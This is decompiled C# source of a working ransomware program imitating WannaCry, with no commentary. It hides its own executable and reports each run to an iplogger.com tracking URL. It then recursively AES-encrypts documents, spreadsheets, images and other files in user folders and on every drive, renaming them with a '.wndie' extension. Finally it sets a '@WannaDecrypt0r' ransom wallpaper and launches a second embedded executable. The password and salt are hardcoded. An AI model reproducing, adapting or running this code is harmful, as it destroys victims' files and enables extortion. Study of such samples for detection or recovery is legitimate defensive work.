using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.Win32;
using w.Properties;

namespace w
{
	// Token: 0x02000003 RID: 3
	internal static class Program
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000020BC File Offset: 0x000002BC
		[STAThread]
		private static void Main()
		{
			Program.Copy();
			GT.get("https://iplogger.com/1wZq67");
			try
			{
				Program.StartAction();
				byte[] img = Resources._img;
				File.WriteAllBytes(Environment.CurrentDirectory + "\\@WannaDecrypt0r.png", img);
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
				registryKey.SetValue("WallpaperStyle", 1.ToString());
				registryKey.SetValue("TileWallpaper", 0.ToString());
				Program.SystemParametersInfo(20, 0, Marshal.StringToBSTR(Environment.CurrentDirectory + "\\@WannaDecrypt0r.png"), 3);
				byte[] d = Resources.d;
				File.WriteAllBytes(Environment.CurrentDirectory + "\\@WannaDecrypt0r.exe", d);
				Process.Start(Environment.CurrentDirectory + "\\@WannaDecrypt0r.exe");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000004 RID: 4
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int SystemParametersInfo(int uAction, int uParam, IntPtr lpvParam, int fuWinIni);

		// Token: 0x06000005 RID: 5 RVA: 0x00002194 File Offset: 0x00000394
		private static void EncryptDirectory(string location)
		{
			try
			{
				string[] files = Directory.GetFiles(location);
				string[] directories = Directory.GetDirectories(location);
				for (int i = 0; i < files.Length; i++)
				{
					string extension = Path.GetExtension(files[i]);
					if (Program.formats.Contains(extension.ToLower()))
					{
						Program.EncryptFile(files[i]);
					}
				}
				for (int j = 0; j < directories.Length; j++)
				{
					Program.EncryptDirectory(directories[j]);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002210 File Offset: 0x00000410
		private static void EncryptFile(string file)
		{
			try
			{
				try
				{
					if ("" == "")
					{
						if (new FileInfo(file).Length <= 4096L)
						{
							byte[] bytes = Program.EncryptAES(File.ReadAllBytes(file), Program.passwordBytes);
							File.WriteAllBytes(file, bytes);
							File.Move(file, file + ".wndie");
						}
						else
						{
							byte[] array = new byte[8192];
							using (BinaryReader binaryReader = new BinaryReader(File.Open(file, FileMode.Open)))
							{
								byte[] array2 = Program.EncryptAES(binaryReader.ReadBytes(4096), Program.passwordBytes);
								Array.Copy(array2, array, array2.Length);
							}
							using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(file, FileMode.Open)))
							{
								binaryWriter.Write(array);
							}
							File.Move(file, file + ".wndie");
						}
					}
				}
				catch (Exception)
				{
					if ("" == "")
					{
						FileAttributes fileAttributes = File.GetAttributes(file);
						if ((fileAttributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
						{
							fileAttributes = Program.Attr(fileAttributes, FileAttributes.ReadOnly);
							File.SetAttributes(file, fileAttributes);
						}
						if (new FileInfo(file).Length <= 4096L)
						{
							byte[] bytes2 = Program.EncryptAES(File.ReadAllBytes(file), Program.passwordBytes);
							File.WriteAllBytes(file, bytes2);
							File.Move(file, file + ".wndie");
						}
						else
						{
							byte[] buffer = new byte[8192];
							using (BinaryReader binaryReader2 = new BinaryReader(File.Open(file, FileMode.Open)))
							{
								buffer = Program.EncryptAES(binaryReader2.ReadBytes(4096), Program.passwordBytes);
							}
							using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(file, FileMode.Open)))
							{
								binaryWriter2.Write(buffer);
							}
							File.Move(file, file + ".wndie");
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002474 File Offset: 0x00000674
		private static byte[] EncryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, Program.SALT, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000255C File Offset: 0x0000075C
		private static FileAttributes Attr(FileAttributes attributes, FileAttributes attributesToRemove)
		{
			return attributes & ~attributesToRemove;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002562 File Offset: 0x00000762
		public static void Copy()
		{
			File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002570 File Offset: 0x00000770
		private static void StartAction()
		{
			File.ReadAllBytes(Assembly.GetEntryAssembly().Location);
			string[] array = new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Recent),
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
				Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
			};
			for (int i = 0; i < array.Length; i++)
			{
				Program.EncryptDirectory(array[i]);
			}
			array = Directory.GetLogicalDrives();
			for (int i = 0; i < array.Length; i++)
			{
				Program.EncryptDirectory(array[i]);
			}
		}

		// Token: 0x04000001 RID: 1
		public static readonly Program.Models Mode = Program.Models.Fast;

		// Token: 0x04000002 RID: 2
		public static readonly int PASSLENGTH = 8;

		// Token: 0x04000003 RID: 3
		public static readonly byte[] SALT = new byte[]
		{
			45,
			46,
			38,
			4,
			19,
			0,
			7,
			62
		};

		// Token: 0x04000004 RID: 4
		public static readonly string[] formats = new string[]
		{
			".dt",
			".1cd",
			".DT",
			".md",
			".dt",
			".hbk",
			".xltm",
			".xltx",
			".xlc",
			".xlm",
			".xlt",
			".hbk",
			".xlw",
			".xlsb",
			".xlsm",
			".xlsx",
			".xls",
			".html",
			"htm",
			".csv",
			".dat",
			".ged",
			".key",
			".keychain",
			".pps",
			".ppt",
			".pptx",
			".sdf",
			".tar",
			".tax2014",
			".tax2015",
			".vcf",
			".xml",
			".txt",
			".dotx",
			"dotm",
			"dot",
			"docm",
			"docb",
			"docx",
			"doc",
			".psd"
		};

		// Token: 0x04000005 RID: 5
		public const int SPI_SETDESKWALLPAPER = 20;

		// Token: 0x04000006 RID: 6
		public const int SPIF_UPDATEINIFILE = 1;

		// Token: 0x04000007 RID: 7
		public const int SPIF_SENDWININICHANGE = 2;

		// Token: 0x04000008 RID: 8
		private static byte[] passwordBytes = new byte[]
		{
			36,
			235,
			31,
			35,
			82,
			85,
			192,
			173
		};

		// Token: 0x02000007 RID: 7
		public enum Models
		{
			// Token: 0x0400000F RID: 15
			Fast
		}
	}
}
